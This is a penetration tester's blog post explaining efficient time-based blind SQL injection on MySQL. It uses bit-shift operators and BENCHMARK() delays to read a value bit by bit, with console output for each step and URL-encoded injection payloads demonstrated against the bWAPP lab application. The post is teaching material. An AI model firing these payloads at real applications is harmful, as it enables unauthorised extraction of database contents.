---
title: "Efficient Time Based Blind SQL Injection using MySQL Bit Functions and Operators"
date: 2017-12-16
draft: false
toc: false
images:
  - "/wp-content/uploads/2017/12/sql-injection.png"
categories:
  - General
  - Security
tags:
  - OWASP
  - Penetration Testing
  - security
  - SQL Injection
  - Web Apps
---

I was performing some penetration tests in 2011 – 2012 against various PHP applications integrated with MySQL databases which were vulnerable to Time Based Blind SQL Injection. Due to various constraints and limitations, exploitation was a little tricky and I was forced to investigate a method which allowed me to retrieve data with as little requests as possible.



I stumbled across this paper demonstrating SQL injection using Bit shifting techniques: [https://www.exploit-db.com/papers/17073/](https://www.exploit-db.com/papers/17073/)



During a recent CTF exercise on Hack the Box ([https://www.hackthebox.eu/](https://www.hackthebox.eu/)) I found myself revisiting this method to exploit some tricky SQL injection.



This blog post will demonstrate how the ‘right shift’ Operator ( **>>** ) can be used to enumerate the Binary bits of a value returned from a SQL query.



**Note: A full description of Bit Functions and Operators can be found at the following URL:** [https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html](https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html)



The right shift operator will shift the number of bits of a binary value 1 location to the right, as illustrated in the example below:


```
mysql> select ascii(b'01110010');

+--------------------+

| ascii(b'01110010') |

+--------------------+

|                114 |

+--------------------+

1 row in set (0.00 sec)

mysql> select ascii(b'01110010') >> 1;

+-------------------------+

| ascii(b'01110010') >> 1 |

+-------------------------+

|                      57 |

+-------------------------+

1 row in set (0.00 sec)
```



This can be utilised to enumerate a character of a string when exploiting Blind SQL injection. This guarantees that the data can be enumerated by a maximum of 8 requests per character if it appears within the full ASCII table.



The data we wish to extract via this method is the first character returned for the query: *select user()*

 [![](/wp-content/uploads/2017/12/0-1.jpg)](/wp-content/uploads/2017/12/0-1.jpg)

**First Bit:** We start by finding the value of the **first** bit:



**?**???????



Two possibilities for this:



**0** (Decimal value: **0**) // TRUE condition



OR



**1** (Decimal value: **1**) // FALSE condition


```
mysql> select if ((ascii((substr(user(),1,1))) >> 7 )=0,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 7 )=0,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| 0                                                                                    |

+--------------------------------------------------------------------------------------+

1 row in set (2.35 sec)
```



The SQL query resulted in a time delay, therefore the condition is TRUE, resulting in the **first** bit being **0** **0**???????

 [![](/wp-content/uploads/2017/12/1.jpg)](/wp-content/uploads/2017/12/1.jpg)

Second Bit:**



Now we need find the value of the **second** bit. As before, there are two possibilities for this:



0**0** (Decimal value: **0**) // TRUE condition



OR



0**1** (Decimal value: **1**) // FALSE condition


```
mysql> select if ((ascii((substr(user(),1,1))) >> 6 )=0,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 6 )=0,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| false                                                                                |

+--------------------------------------------------------------------------------------+

1 row in set (0.00 sec)
```



The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the **second **bit being **1** 0**1**?????

 [![](/wp-content/uploads/2017/12/2.jpg)](/wp-content/uploads/2017/12/2.jpg)

**Third Bit:** Now we need find the value of the **third** bit. As before, there are two possibilities for this:



01**0** (Decimal value: **2**) // TRUE



OR



01**1** (Decimal value: **3**) // FALSE


```
mysql> select if ((ascii((substr(user(),1,1))) >> 5 )=2,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 5 )=2,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| false                                                                                |

+--------------------------------------------------------------------------------------+

1 row in set (0.00 sec)
```



The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the **third** bit being **1** 01**1**?????

 [![](/wp-content/uploads/2017/12/3.jpg)](/wp-content/uploads/2017/12/3.jpg)

**Fourth Bit:** Now we need find the value of the **fourth** bit. As before, there are two possibilities for this:



011**0** (Decimal: **6**) // TRUE



OR



011**1** (Decimal: **7**) // FALSE


```
mysql> select if ((ascii((substr(user(),1,1))) >> 4 )=6,benchmark(10000000,sha1('test')), 'false');

+--------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 4 )=6,benchmark(10000000,sha1('test')), 'false') |

+--------------------------------------------------------------------------------------+

| false                                                                                |

+--------------------------------------------------------------------------------------+

1 row in set (0.00 sec)
```



The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the **fourth** bit being **1** 011**1**????

 [![](/wp-content/uploads/2017/12/4.jpg)](/wp-content/uploads/2017/12/4.jpg)

**Fifth Bit:** Now we need find the value of the **fifth** bit. As before, there are two possibilities for this:



0111**0** (Decimal: **14**) /// TRUE



OR



0111**1** (Decimal: **15**) // FALSE


```
mysql> select if ((ascii((substr(user(),1,1))) >> 3 )=14,benchmark(10000000,sha1('test')), 'false');

+---------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 3 )=14,benchmark(10000000,sha1('test')), 'false') |

+---------------------------------------------------------------------------------------+

| 0                                                                                     |

+---------------------------------------------------------------------------------------+

1 row in set (2.46 sec)
```



The SQL query resulted in a time delay, therefore the condition is **TRUE**, resulting in the **fifth **bit being **0** 0111**0**???

 [![](/wp-content/uploads/2017/12/5.jpg)](/wp-content/uploads/2017/12/5.jpg)

**Sixth Bit:** Now we need find the value of the **sixth** bit. As before, there are two possibilities for this:



01110**0** (Decimal: **28**) // TRUE



OR



01110**1** (Decimal: **29**) // FALSE


```
mysql> select if ((ascii((substr(user(),1,1))) >> 2 )=28,benchmark(10000000,sha1('test')), 'false');

+---------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 2 )=28,benchmark(10000000,sha1('test')), 'false') |

+---------------------------------------------------------------------------------------+

| 0                                                                                     |

+---------------------------------------------------------------------------------------+

1 row in set (2.44 sec)
```



The SQL query resulted in a time delay, therefore the condition is **TRUE**, resulting in the **sixth **bit being **0** 01110**0**??

 [![](/wp-content/uploads/2017/12/6.jpg)](/wp-content/uploads/2017/12/6.jpg)

**Seventh Bit:** Now we need find the value of the **seventh **bit. As before, there are two possibilities for this:



011100**0** (Decimal: 56) // TRUE



OR



011100**1** (Decimal: 57) // FALSE


```
mysql> select if ((ascii((substr(user(),1,1))) >> 1 )=56,benchmark(10000000,sha1('test')), 'false');

+---------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 1 )=56,benchmark(10000000,sha1('test')), 'false') |

+---------------------------------------------------------------------------------------+

| false                                                                                 |

+---------------------------------------------------------------------------------------+

1 row in set (0.00 sec)
```



The SQL query resulted in no time delay, therefore the condition is FALSE, resulting in the **seventh** bit being **1** The fourth bit must be **1** 011100**1**?

 [![](/wp-content/uploads/2017/12/7.jpg)](/wp-content/uploads/2017/12/7.jpg)

**Eighth Bit:** Now we need find the value of the **eighth and final **bit. As before, there are two possibilities for this:



0111001**0** (Decimal: **114**) // TRUE



OR



0111001**1** (Decimal: **115**) // FALSE


```
mysql> select if ((ascii((substr(user(),1,1))) >> 0 )=114,benchmark(10000000,sha1('test')), 'false');

+----------------------------------------------------------------------------------------+

| if ((ascii((substr(user(),1,1))) >> 0 )=114,benchmark(10000000,sha1('test')), 'false') |

+----------------------------------------------------------------------------------------+

| 0                                                                                      |

+----------------------------------------------------------------------------------------+

1 row in set (2.33 sec)
```



The SQL query resulted in a time delay, therefore the condition is **TRUE**, resulting in the **eight **bit being **0** 0111001**0** [![](/wp-content/uploads/2017/12/8.jpg)](/wp-content/uploads/2017/12/8.jpg)

Now we can conclude that the binary value for the first character returned by the query: *select user()* is **01110010** resulting in a decimal value of **114**. 114 being the ‘**r**’ character of the ASCII table.


```
mysql> select user();

+----------------+

| user()         |

+----------------+

| root@localhost |

+----------------+

1 row in set (0.00 sec)
```



In order to demonstrate this type of Blind SQL injection attack, I have demenstrated how to enumerate the first and last binary bit of the first character returned by ‘*select user()*’ on the bWAPP vulnerable application: (https://www.vulnhub.com/entry/bwapp-bee-box-v16,53/)


1. SQLi string returning a TRUE condition for the first bit:


```
test%27+and+if+((ascii((substr(user(),1,1)))+>>+7+)=0,benchmark(5000000,md5('test')),+'false')%23
```

 [![](/wp-content/uploads/2017/12/ks-sql1.jpg)](/wp-content/uploads/2017/12/ks-sql1.jpg)
1. SQLi string returning a FALSE condition for the first bit:


```
test%27+and+if+((ascii((substr(user(),1,1)))+>>+7+)=1,benchmark(5000000,md5('test')),+'false')%23
```

 [![](/wp-content/uploads/2017/12/ks-sql2.jpg)](/wp-content/uploads/2017/12/ks-sql2.jpg)
1. SQLi string returning a TRUE condition for the eight bit:


```
test%27+and+if+((ascii((substr(user(),1,1)))+>>+0+)=114,benchmark(5000000,md5('test')),+'false')%23
```

 [![](/wp-content/uploads/2017/12/ks-sql3.jpg)](/wp-content/uploads/2017/12/ks-sql3.jpg)
### About The Author


 -  [](/)

       [**](https://www.facebook.com/sharer.php?u=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/) [**](http://twitter.com/share?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&text=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators) [**](mailto:?subject=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators&body=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/) [**](https://www.linkedin.com/sharing/share-offsite/?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators) [**](javascript:pinIt();) [**](https://t.me/share/url?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators) [**](https://api.whatsapp.com/send?text=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators) [**](https://www.reddit.com/submit?url=/efficient-time-based-blind-sql-injection-using-mysql-bit-functions-and-operators/&title=Efficient%20Time%20Based%20Blind%20SQL%20Injection%20using%20MySQL%20Bit%20Functions%20and%20Operators) [**](javascript:window.print())    
## Post navigation

 [Executing Metasploit & Empire Payloads from MS Office Document Properties (part 2 of 2)](/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/)[Wardriving with Kismet, GPS and Google Earth.](/posts/wardriving-with-kismet-gps-and-google-earth/)
